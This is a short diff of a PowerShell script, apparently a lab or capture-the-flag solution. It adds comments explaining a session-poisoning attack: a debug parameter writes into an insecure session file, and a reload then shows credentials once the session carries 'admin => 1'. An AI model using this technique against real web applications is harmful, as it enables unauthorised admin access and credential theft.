@@ -23,12 +23,15 @@ $headers = @{
     "Content-Type"  = "application/x-www-form-urlencoded"
 }
 
+#establish a session
 $commandurl = $url;
 $response = iwr -Headers $headers -URI $url -SessionVariable requestSession;
 
+#write into the insecure session file
 $commandurl = $url + "?debug&name=$name";
 $response = iwr -Headers $headers -URI $commandurl -Method Post -WebSession  $requestSession;
 
+#load page again to be shown the credentials, since the session now has "admin => 1"
 $commandurl = $url;
 $response = iwr -Headers $headers -URI $commandurl -Method Get -WebSession  $requestSession;
 
